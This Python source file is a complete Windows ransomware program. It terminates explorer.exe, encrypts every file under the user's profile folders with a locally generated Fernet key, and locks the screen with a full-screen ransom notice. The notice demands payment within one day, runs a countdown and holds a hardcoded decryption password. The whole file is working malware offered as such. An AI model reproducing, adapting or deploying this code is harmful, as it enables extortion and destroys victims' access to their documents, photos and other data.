import os
import subprocess
import sys
import time
from tkinter import *
from datetime import datetime
from pynput.keyboard import Controller, Key
import sys
from cryptography.fernet import Fernet

os.system("taskkill /f /im explorer.exe")  # KILLING  THE GUI INTARCE

# GENERATE A KEY FOR DECRYPTION
key = Fernet.generate_key()
thekey = open("mykey.key", "wb")
thekey.write(key)
thekey.close()
secrit = open("sec.txt", "w")
files = []
runpath = os.getcwd()
tr = 1
user = ""


# MAIN ENCRYPTION FUNCTION
def enc():
    global files
    global tr
    global user
    if tr == 1:
        pass
    elif tr == 2:

        user = "C:" + "\\" + "Users"
        os.chdir(user)
        uname = os.getlogin()

        username = "C:" + "\\" + "Users" + "\\" + uname  # CHNAGE THE DIRECTORY TO CURRENT
        os.chdir(username)

        for subf in os.listdir():

            # ENCRYPTION FUNCTION

            def encrypt():
                for file in files:
                    if file == "mykey.key" or file == "sec.txt" or file == "BAT.exe":  # AVIODE PROGRAME FILES
                        pass
                    else:
                        try:
                            thefile = open(file, "rb")
                            contents = thefile.read()
                            encrypt = Fernet(key).encrypt(contents)
                            afile = open(file, "wb")
                            afile.write(encrypt)
                            afile.close()
                            print(file, "encrpted")
                            files.remove(file)
                        except:
                            pass
                        finally:
                            pass

            userpath = os.getcwd()

            if os.path.isfile(subf):
                files.append(subf)

                encrypt()

                # AVIDE WINDOWS OS FILE FROM EXCRYPTION
            elif os.path.isdir(subf) and subf != "MicrosoftEdgeBackups" and subf != "Application Data" and subf != "AppData" and subf != "PycharmProjects" and subf != "Local Settings":
                try:
                    subpath1 = os.getcwd()

                    subpath = os.getcwd() + "\\" + subf
                    
                    os.chdir(subpath)

                    for subf in os.listdir():

                        if os.path.isfile(subf):
                            files.append(subf)

                            encrypt()

                        elif os.path.isdir(subf):

                            subpath2 = os.getcwd()
                            subpath = os.getcwd() + "\\" + subf

                            
                            os.chdir(subpath)

                            for subf in os.listdir():

                                if os.path.isfile(subf):

                                    files.append(subf)

                                    encrypt()
                                elif os.path.isdir(subf):

                                    subpath3 = os.getcwd()
                                    subpath = os.getcwd() + "\\" + subf

                                    
                                    os.chdir(subpath)

                                    for subf in os.listdir():

                                        if os.path.isfile(subf):
                                            files.append(subf)

                                            encrypt()
                                        elif os.path.isdir(subf):

                                            subpath4 = os.getcwd()
                                            subpath = os.getcwd() + "\\" + subf

                                            
                                            os.chdir(subpath)

                                            for subf in os.listdir():

                                                if os.path.isfile(subf):
                                                    files.append(subf)

                                                    encrypt()
                                                elif os.path.isdir(subf):

                                                    subpath5 = os.getcwd()
                                                    subpath = os.getcwd() + "\\" + subf

                                                    
                                                    os.chdir(subpath)

                                                    for subf in os.listdir():

                                                        if os.path.isfile(subf):
                                                            files.append(subf)

                                                            encrypt()
                                                        elif os.path.isdir(subf):

                                                            subpath6 = os.getcwd()
                                                            subpath = os.getcwd() + "\\" + subf

                                                            
                                                            os.chdir(subpath)

                                                            for subf in os.listdir():

                                                                if os.path.isfile(subf):
                                                                    files.append(subf)

                                                                    encrypt()
                                                                elif os.path.isdir(subf):

                                                                    subpath7 = os.getcwd()
                                                                    subpath = os.getcwd() + "\\" + subf

                                                                    
                                                                    os.chdir(subpath)

                                                                    for subf in os.listdir():

                                                                        if os.path.isfile(subf):
                                                                            files.append(subf)

                                                                            encrypt()

                                                                    os.chdir(subpath7)
                                                            os.chdir(subpath6)
                                                    os.chdir(subpath5)
                                            os.chdir(subpath4)
                                    os.chdir(subpath3)
                            os.chdir(subpath2)
                            print(os.getcwd())
                    os.chdir(subpath1)
                except:
                    pass

                os.chdir(userpath)

            
        os.chdir(runpath)
    tr += 1

    L7.after(1000, enc)


#xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxXXXXXXXXXXXXXXXXXXXXX
############################################################################################################################################3

# MAIN DECRIPT FUNCTION
def decriptfun():
    global user
    import os
    enterkey = code.get()
    # checking the key is valid
    if enterkey == "greejith":

        # opening the key to decript
        sc = open("mykey.key", "rb")
        thkey = sc.read()
        defiles = []
        os.chdir(user)
        
        username = os.getlogin()
        os.chdir(username)
               
        userpath = os.getcwd()
        for subf in os.listdir():

            def decript():
                for defile in defiles:
                    if defile == "mykey.key" or defile == "sec.txt" or defile == "BAT.exe":
                        pass
                    else:
                        try:

                            thefile = open(defile, "rb")
                            decontents = thefile.read()
                            dencrypt = Fernet(thkey).decrypt(decontents)

                            defile = open(defile, "wb")
                            defile.write(dencrypt)
                            defile.close()

                        except:
                            pass
                        finally:
                            pass

            if os.path.isfile(subf):
                defiles.append(subf)
                

                decript()

            
            elif os.path.isdir(
                    subf) and subf != "MicrosoftEdgeBackups" and subf != "Application Data" and subf != "AppData":
                try:
                    
                    subpath1 = os.getcwd()
                    subpath = os.getcwd() + "\\" + subf

                    os.chdir(subpath)
                    for subf in os.listdir():
                        defiles = []
                        if os.path.isfile(subf):
                            defiles.append(subf)

                            decript()


                        elif os.path.isdir(subf):

                            subpath2 = os.getcwd()
                            subpath = os.getcwd() + "\\" + subf

                            os.chdir(subpath)

                            for subf in os.listdir():

                                if os.path.isfile(subf):
                                    defiles.append(subf)

                                    decript()
                                elif os.path.isdir(subf):

                                    subpath3 = os.getcwd()
                                    subpath = os.getcwd() + "\\" + subf

                                    os.chdir(subpath)

                                    for subf in os.listdir():

                                        if os.path.isfile(subf):
                                            defiles.append(subf)

                                            decript()

                                        elif os.path.isdir(subf):

                                            subpath4 = os.getcwd()
                                            subpath = os.getcwd() + "\\" + subf

                                            os.chdir(subpath)

                                            for subf in os.listdir():

                                                if os.path.isfile(subf):
                                                    defiles.append(subf)

                                                    decript()

                                                elif os.path.isdir(subf):

                                                    subpath5 = os.getcwd()
                                                    subpath = os.getcwd() + "\\" + subf

                                                    os.chdir(subpath)

                                                    for subf in os.listdir():

                                                        if os.path.isfile(subf):
                                                            defiles.append(subf)

                                                            decript()

                                                        elif os.path.isdir(subf):

                                                            subpath6 = os.getcwd()
                                                            subpath = os.getcwd() + "\\" + subf

                                                            os.chdir(subpath)

                                                            for subf in os.listdir():

                                                                if os.path.isfile(subf):
                                                                    defiles.append(subf)

                                                                    decript()

                                                                elif os.path.isdir(subf):

                                                                    subpath7 = os.getcwd()
                                                                    subpath = os.getcwd() + "\\" + subf

                                                                    os.chdir(subpath)

                                                                    for subf in os.listdir():

                                                                        if os.path.isfile(subf):
                                                                            defiles.append(subf)

                                                                            decript()

                                                                        elif os.path.isdir(subf):

                                                                            subpath8 = os.getcwd()
                                                                            subpath = os.getcwd() + "\\" + subf

                                                                            os.chdir(subpath)

                                                                            for subf in os.listdir():

                                                                                if os.path.isfile(subf):
                                                                                    defiles.append(subf)

                                                                                    decript()

                                                                            os.chdir(subpath8)

                                                                    os.chdir(subpath7)

                                                            os.chdir(subpath6)

                                                    os.chdir(subpath5)

                                            os.chdir(subpath4)

                                    os.chdir(subpath3)

                            os.chdir(subpath2)
                    os.chdir(subpath1)
                except:
                    pass
                finally:
                    pass

                os.chdir(userpath)

        subprocess.Popen("C:\Windows\explorer.exe")
        sys.exit()
    # writing the key to sec.txt
    keywrite = open("sec.txt", "w")
    keywrite.write(enterkey)
    keywrite.close()


# counter function
counter = 1668931200

# TIME FUNCTION
def counter_label():
    global counter
    tt = datetime.fromtimestamp(counter)
    string = tt.strftime("%H:%M:%S")
    display = string

    L4['text'] = display

    keyboard = Controller()
    keyboard.press(Key.esc)
    keyboard.tap(Key.esc)
    keyboard.press(Key.esc)

    L4.after(10, counter_label)

    counter += .02
    if counter == 1668934800:
        sys.exit()


#  GUI FUNCTION
from tkinter import *

secritkey = open("sec.txt", "r")
matchkey = secritkey.read()
while matchkey != "greejith":
    win = Tk()
    win.config(bg="red4")

    win.attributes("-fullscreen", True)

    L3 = Label(text="🔐", font=("Chiller", 200), width=3, height=1, bg="red4")
    L3.place(x=44, y=80)
    L4 = Label(font=("Chiller", 40), width=8, height=1, bg="red4")
    L4.place(x=250, y=40)
    counter_label()
    L5 = Label(text="ENTER THE KEY", width=15, height=2, font=("Chiller", 32), bg="red4", fg="black")
    L5.place(x=65, y=380)
    L6 = Label(text="00:59:60", font=("Chiller", 40), width=8, height=1, bg="red4")
    L6.place(x=5, y=40)
    L8 = Label(text="⚠", font=("Chiller", 150), width=3, height=1, bg="red4", fg="yellow3")
    L8.place(x=1204, y=150)
    L9 = Label(text="""                                Don't shutdown.

                           If you shutdown you might be lose you files""", font=("bold", 15), width=48, height=3,
               bg="red4",
               fg="black")

    L9.place(x=1025, y=390)

    L7 = Label(text="""What Happened to My Computer?

    Your important files are encrypted.
    Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted Nobody can recover your files without my permission.

    How Recover My Files?

    Sure. I guarantee that you can recover all your files safely and easily. 
    if you want to decrypt  your files, you need to pay. You only have 1 day to submit the payment.  if you don't pay with in 1 day, you won't be able to recover your files forever. 
    Your files will be lost on

    """, bg="red4", fg="black", height=21, font=("bold", 12))
    L7.place(x=160, y=530)
    L7 = Label(text="🦇", font=("Jokerman", 280), width=2, height=1, bg="red4", fg="black")
    L7.place(x=550, y=1)
    code = Entry(width=25)
    code.place(x=165, y=470)
    b1 = Button(text="DECRIPT", bg="black", fg="white", height=1, width=10, command=decriptfun)
    b1.place(x=200, y=520)
    # calling encrypt function
    enc()
    counter_label()
    win.mainloop()
    secritkey = open("sec.txt", "r")
    matchkey = secritkey.read()
    continue


















